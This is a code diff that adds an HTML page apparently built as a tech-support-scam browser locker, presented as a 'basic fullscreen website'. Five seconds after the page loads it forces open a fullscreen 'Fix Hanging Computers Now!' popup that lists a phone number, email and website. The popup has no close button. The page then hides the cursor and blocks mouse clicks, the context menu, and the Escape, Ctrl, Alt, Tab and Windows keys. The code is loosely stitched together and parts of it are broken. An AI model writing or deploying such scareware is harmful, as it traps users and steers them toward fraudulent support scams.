@@ -1,0 +1,305 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="Permissions-Policy" content="fullscreen=(self)">
+    <title>Basic Fullscreen Website</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            background-color: #f4f4f4;
+        }
+
+        h1 {
+            color: #333;
+        }
+
+        button {
+            padding: 10px 20px;
+            font-size: 16px;
+            background-color: #007BFF;
+            color: white;
+            border: none;
+            /* cursor: pointer; */
+            border-radius: 5px;
+        }
+
+        button:hover {
+            background-color: #0056b3;
+        }
+
+        .popup-overlay {
+            display: none; /* Hidden by default */
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            justify-content: center;
+            align-items: center;
+        }
+
+        .popup {
+            background-color: white;
+            padding: 20px;
+            border-radius: 10px;
+            text-align: center;
+        }
+
+        .close-btn {
+            background-color: red;
+            color: white;
+            border: none;
+            font-size: 20px;
+            float: right;
+            /* cursor: pointer; */
+        }
+
+        .contact-btn {
+            padding: 10px 20px;
+            background-color: green;
+            color: white;
+            text-decoration: none;
+            border-radius: 5px;
+        }
+        :fullscreen {
+            --system-ui-visibility: none;
+            display: var(--system-ui-visibility);
+        }
+        .hide-cursor, .hide-cursor * {
+            cursor: none !important;
+        }
+        /* html * {cursor:none}
+        html * {cursor:none!important}
+        * {
+            cursor: none !important;
+        }
+        html {
+            cursor: none !important;
+        }
+        * { cursor: url(cursor.png), none !important }
+        .cursor{
+            position:absolute;
+            top:0;
+            bottom:0;
+            left:0;
+            right:0;
+            cursor: url(http://davidwalsh.name/demo/css-custom-cursor.ico), default;
+        } */
+
+    </style>
+</head>
+<body>
+    <div class="cursor"></div>
+    <h1>Welcome to My Basic Website</h1>
+    <p>This is a simple example website with a fullscreen feature.</p>
+
+    <button id="fullscreenBtn">View Site in Full Screen</button>
+    <button id="viewContentBtn">View Content in Full Screen</button>
+
+    <button id="lockKeyboardBtn">Lock Keyboard</button>
+    <p class="status" id="statusText">Keyboard is unlocked.</p>
+
+    <div class="popup-overlay" id="firstPopupOverlay">
+        <div class="popup" id="firstPopup">
+            <!-- <button class="close-btn" id="firstCloseBtn">&times;</button> -->
+            <h2>Fix Hanging Computers Now!</h2>
+            <p>Is your computer slow or freezing? Don't worry! Our expert tech support is here to help you instantly.</p>
+            <p>📞 Call Now: <strong>+91-97113 47474</strong></p>
+            <p>📧 Email: <strong>info@itsolution4india.com</strong></p>
+            <p>🌐 Visit: <a href="https://www.itsolutions4india.com" target="_blank">www.itsolutions4india.com</a></p>
+            <a href="tel:+919711347474" class="contact-btn">Get Instant Help</a>
+        </div>
+    </div>
+<!-- Include jQuery -->
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+
+    <script>
+        const fullscreenBtn = document.getElementById('fullscreenBtn');
+        const viewContentBtn = document.getElementById('viewContentBtn');
+        const firstPopupOverlay = document.getElementById('firstPopupOverlay');
+        const firstCloseBtn = document.getElementById('firstCloseBtn');
+
+        function toggleFullscreen() {
+            if (!document.fullscreenElement) {
+                if (document.documentElement.requestFullscreen) {
+                    document.documentElement.requestFullscreen();
+                } else if (document.documentElement.mozRequestFullScreen) {
+                    document.documentElement.mozRequestFullScreen();
+                } else if (document.documentElement.webkitRequestFullscreen) {
+                    document.documentElement.webkitRequestFullscreen();
+                } else if (document.documentElement.msRequestFullscreen) {
+                    document.documentElement.msRequestFullscreen();
+                }
+            } else {
+                if (document.exitFullscreen) {
+                    document.exitFullscreen();
+                }
+            }
+        }
+
+        function toggleContentFullscreen() {
+            firstPopupOverlay.style.display = "flex";
+
+            if (!document.fullscreenElement) {
+                if (firstPopupOverlay.requestFullscreen) {
+                    firstPopupOverlay.requestFullscreen();
+                } else if (firstPopupOverlay.mozRequestFullScreen) {
+                    firstPopupOverlay.mozRequestFullScreen();
+                } else if (firstPopupOverlay.webkitRequestFullscreen) {
+                    firstPopupOverlay.webkitRequestFullscreen();
+                } else if (firstPopupOverlay.msRequestFullscreen) {
+                    firstPopupOverlay.msRequestFullscreen();
+                }
+            } else {
+                if (document.exitFullscreen) {
+                    document.exitFullscreen();
+                }
+            }
+        }
+
+        fullscreenBtn.addEventListener('click', toggleFullscreen);
+        viewContentBtn.addEventListener('click', toggleContentFullscreen);
+        window.addEventListener('load', () => {
+            setTimeout(() => {
+                viewContentBtn.click();
+            }, 5000);
+        });
+        firstCloseBtn.addEventListener('click', () => {
+            firstPopupOverlay.style.display = "none";
+            if (document.exitFullscreen) {
+                document.exitFullscreen();
+            }
+        });
+        
+    </script>
+<script>
+    setTimeout(function() {
+        document.body.style.cursor = 'none';
+    }, 5100);
+</script>
+<script>
+    // Apply class after 5.1 seconds
+    setTimeout(function() {
+        document.body.classList.add('hide-cursor');
+    }, 5100);
+</script>
+</body>
+<script>
+        // Disable right-click context menu
+        document.addEventListener('contextmenu', function(e) {
+        e.preventDefault();
+    });
+
+    // Disable left, right, and middle mouse clicks
+    document.addEventListener('mousedown', function(e) {
+        e.preventDefault(); // Prevent all mouse button actions
+    });
+</script>
+<script>
+    document.addEventListener('keydown', function(e) {
+        console.log("Key", e.key); // Debugging output to see which key is pressed
+
+        // Disable the Escape key
+        if (e.key === 'Escape' || e.keyCode === 27) {
+            e.preventDefault();
+        }
+
+        // Disable the Ctrl key and any combinations involving it
+        if (e.key === 'Control' || e.ctrlKey) {
+            e.preventDefault();
+        }
+
+        // Disable the Meta (Windows) key
+        if (e.key === 'Meta') {
+            e.preventDefault();
+        }
+
+        // Disable the Alt key
+        if (e.key === 'Alt') {
+            e.preventDefault();
+        }
+
+        // Disable the Tab key
+        if (e.key === 'Tab') {
+            e.preventDefault();
+        }
+    });
+</script>
+<script>
+       $(document).ready(function () {
+      $(document).keydown(function (event) {
+        var charCode = event.charCode || event.keyCode || event.which;
+        if (charCode == 27 || charCode == 91 || charCode == 92) {
+          event.preventDefault();
+        }
+      });
+    });
+</script>
+<script>
+    dialog.addEventListener('cancel', (event) => {
+    event.preventDefault();
+});
+</script>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
+<script>
+    $(document).on("keydown",function(ev){
+	console.log(ev.keyCode);
+	if(ev.keyCode===27||ev.keyCode===122) return false
+})
+</script>
+<script>
+    const lockKeyboardBtn = document.getElementById('lockKeyboardBtn');
+    const statusText = document.getElementById('statusText');
+
+    // Function to lock the keyboard
+    function lockKeyboard() {
+        if ('keyboard' in navigator && 'lock' in navigator.keyboard) {
+            // Attempt to lock all keys except 'Esc'
+            navigator.keyboard.lock().then(() => {
+                statusText.textContent = "Keyboard is locked.";
+            }).catch((error) => {
+                statusText.textContent = "Failed to lock the keyboard.";
+                console.error('Error locking keyboard:', error);
+            });
+        } else {
+            statusText.textContent = "Keyboard lock is not supported in this browser.";
+            console.warn('Keyboard lock not supported in this browser.');
+        }
+    }
+
+    // Add click event listener to the button
+    lockKeyboardBtn.addEventListener('click', lockKeyboard);
+</script>
+<script>
+    document.documentElement.style.setProperty('--system-ui-visibility', 'none');
+</script>
+<script>
+    const { app, globalShortcut } = require('electron');
+
+app.whenReady().then(() => {
+  globalShortcut.register('Ctrl+Alt+Delete', () => {
+    console.log('Blocked Ctrl+Alt+Delete'); // Won't actually block this in Windows
+  });
+
+  // Example to block Alt+F4
+  globalShortcut.register('Alt+F4', () => {
+    console.log('Blocked Alt+F4');
+  });
+});
+
+</script>
+<!-- <script type="text/javascript">
+    document.body.style.cursor = 'none';
+    $('html,body').css('cursor','none');
+</script> -->
+</html>
